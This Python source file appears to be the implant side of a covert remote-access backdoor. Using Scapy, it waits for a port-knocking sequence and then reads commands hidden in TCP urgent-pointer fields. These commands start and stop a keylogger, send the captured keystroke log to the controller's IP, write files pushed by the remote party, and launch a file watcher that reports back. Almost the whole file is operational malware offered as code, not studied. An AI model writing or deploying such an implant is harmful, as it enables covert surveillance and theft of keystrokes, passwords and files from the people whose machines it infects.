from scapy.all import sniff, TCP, IP, send
import base64
from scapy.layers.inet import IP
import os
import time
import subprocess
import threading
import socket
import requests  # Add this import for sending HTTP requests


def get_local_ip():
    """Get the local IP address of the machine."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external IP to get the local IP address
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = "127.0.0.1"
    finally:
        s.close()
    return local_ip

# Configuration variables
dest_ip = input("Enter the destination IP for sending packets: ")
local_ip = get_local_ip()
source_port = 80
dest_port = 80
received_data = ""
eof_signal = "//"
keylogger_start_signal = 1
keylogger_stop_signal = 2
file_transfer_signal = 3
watcher_start_signal = 4
watcher_stop_signal = 5
current_signal = None
signal_received = False
keylogger_process = None
watcher_process = None
knock_sequence = [3434, 4545, 5656] 
knock_index = 0
communication_port = 80
ack_event = threading.Event()
timeout = 10  # Timeout in seconds for acknowledgment
knock_ip = None

def send_acknowledgment(ip, port):
    """Send a TCP acknowledgment packet back to the original sender."""
    ip_layer = IP(dst=ip)
    # Change flags from "A" to "SA" and use sport=80 to match expected port
    tcp_layer = TCP(sport=80, dport=port, flags="SA")
    ack_packet = ip_layer/tcp_layer
    send(ack_packet)
    print(f"Sent acknowledgment to {ip}:{port}")

def packet_callback(packet):
    """Callback function to process each sniffed packet."""
    global current_signal, received_data, signal_received, knock_index, knock_ip
    if packet.haslayer(TCP):
        src_ip = packet[IP].src
        src_port = packet[TCP].sport
        dport = packet[TCP].dport

        if knock_index == 0 and dport == knock_sequence[0]:
            knock_ip = src_ip
            knock_index += 1
            print(f"First port knock detected.")
        elif knock_index > 0 and src_ip == knock_ip:
            if dport in knock_sequence[1:]:
                knock_index += 1
                if knock_index == len(knock_sequence):
                    print("Port-knocking sequence completed. Sending acknowledgment.")
                    # Simple acknowledgment - just send one SYN-ACK with some data: ACK
                    ack = IP(dst=knock_ip)/TCP(sport=source_port, dport=dest_port, flags="SA", seq=1, ack=1)
                    ack = ack / b"ACK"
                    send(ack)
                    knock_index = 0
                    knock_ip = None
                    wait_for_signal()

def wait_for_signal():
    """Wait for a signal after port-knocking sequence."""
    print("Waiting for signal...")
    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': signal_callback, 'store': 0})
    sniff_thread.start()

def signal_callback(packet):
    """Callback function to process each sniffed packet for signals."""
    global current_signal, received_data, signal_received
    if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
        urgent_pointer_value = packet[TCP].urgptr

        # Check for initial signal
        if current_signal is None or current_signal == 0:
            if urgent_pointer_value in [keylogger_start_signal, keylogger_stop_signal, file_transfer_signal, watcher_start_signal, watcher_stop_signal]:
                current_signal = urgent_pointer_value
                signal_received = True
                print(f"Initial Signal Received: {current_signal}")
                handle_initial_signal()
                return

        # Process urgent pointer data
        urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode(errors='ignore')
        received_data += urgent_pointer_chunk

        print(f"Received Urgent Pointer: {urgent_pointer_value}")
        print(f"Received Data Chunk: {urgent_pointer_chunk}")

        try:
            # Decode received data
            padded_data = received_data + '=' * ((4 - len(received_data) % 4) % 4)
            decoded_data = base64.b64decode(padded_data)
            print(f"Decoded Data: {decoded_data}")
            if eof_signal.encode() in decoded_data:
                print("EOF signal detected.")
                handle_data(decoded_data.replace(eof_signal.encode(), b''))
                reset_state()
                wait_for_port_knocking()
            elif received_data.endswith(base64.b64encode(eof_signal.encode()).decode()):
                print("EOF signal detected in the last packet.")
                handle_data(decoded_data.replace(eof_signal.encode(), b''))
                reset_state()
                wait_for_port_knocking()
        except (UnicodeDecodeError, base64.binascii.Error) as e:
            print(f"Decoding error: {e}")

def handle_initial_signal():
    """Handle the initial signal received."""
    global current_signal
    if current_signal == keylogger_start_signal:
        print("Start keylogger signal received.")
        start_keylogger()
    elif current_signal == keylogger_stop_signal:
        print("Stop keylogger signal received.")
        stop_keylogger()
    elif current_signal == file_transfer_signal:
        print("File transfer signal received.")
        prepare_file_transfer()
    elif current_signal == watcher_stop_signal:
        print("Stop watcher signal received.")
        stop_watcher()

def start_keylogger():
    """Start the keylogger process."""
    global keylogger_process
    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
    keylogger_process = subprocess.Popen(['python3', os.path.join(script_dir, 'logger.py')])
    reset_state()
    wait_for_port_knocking()

def stop_keylogger():
    """Stop the keylogger process and send the log file."""
    global keylogger_process
    if keylogger_process:
        keylogger_process.terminate()
        keylogger_process = None
    time.sleep(3)
    send_log_file()
    print("Keylogger stopped and log file sent.")
    reset_state()
    wait_for_port_knocking()

def start_watcher(file_path):
    """Start the watcher process."""
    global watcher_process
    script_dir = os.path.abspath('.')  # Changed from os.path.dirname(os.path.abspath(__file__))
    watcher_process = subprocess.Popen(['python3', os.path.join(script_dir, 'watcher.py'), file_path, dest_ip])
    reset_state()
    wait_for_port_knocking()

def stop_watcher():
    """Stop the watcher process."""
    global watcher_process
    if watcher_process:
        watcher_process.terminate()
        watcher_process = None
    reset_state()
    wait_for_port_knocking()

def send_log_file():
    """Send the log file using the encoder script."""
    log_file_path = os.path.join(os.getcwd(), "log.txt")
    if os.path.isfile(log_file_path):
        os.system(f'python3 encoder.py FT:{dest_ip} "{log_file_path}"')
    else:
        print("Log file not found.")

def prepare_file_transfer():
    """Prepare for file transfer by starting the sniffing process."""
    while current_signal == file_transfer_signal:
        wait_for_signal()

def handle_data(decoded_data):
    """Handle the received data based on the current signal."""
    global current_signal
    if current_signal == file_transfer_signal:
        save_file(decoded_data)
    elif current_signal == watcher_start_signal:
        watcher_command = decoded_data.decode(errors='ignore')
        print(f"Watcher command received: {watcher_command}")
        start_watcher(watcher_command)
    reset_state()

def save_file(decoded_data):
    """Save the file from the decoded data."""
    try:
        metadata, file_content = split_metadata_content(decoded_data.decode(errors='ignore'))
    except ValueError:
        print("Error splitting metadata and content.")
        return

    if not metadata or not file_content:
        return

    file_name = metadata.strip()
    try:
        file_content = base64.b64decode(file_content.encode())
    except (UnicodeDecodeError, base64.binascii.Error) as e:
        print(f"Decoding error: {e}. Forcing save.")
        file_content = file_content.encode()

    save_to_file(file_name, file_content)

def split_metadata_content(decoded_data):
    """Split the decoded data into metadata and content."""
    try:
        return decoded_data.split('|', 1)
    except ValueError:
        print("Error splitting metadata and content.")
        return None, None

def save_to_file(file_name, content):
    """Save the content to a file."""
    with open(os.path.join(os.getcwd(), file_name), 'wb') as file:
        file.write(content)
    print(f"File {file_name} created successfully.")

def reset_state():
    """Reset the state variables."""
    global current_signal, received_data, signal_received
    received_data = ""
    current_signal = 0
    signal_received = False
    print("State reset.")

def open_communication_port():
    """Open the designated communication port."""
    global communication_port
    print(f"Communication port {communication_port} opened.")

def wait_for_port_knocking():
    """Wait for the port-knocking sequence."""
    print("Waiting for port-knocking sequence...")
    sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': packet_callback, 'store': 0})
    sniff_thread.start()

def run_async_task(task):
    """Run a task asynchronously."""
    threading.Thread(target=task).start()

if __name__ == "__main__":
    wait_for_port_knocking()
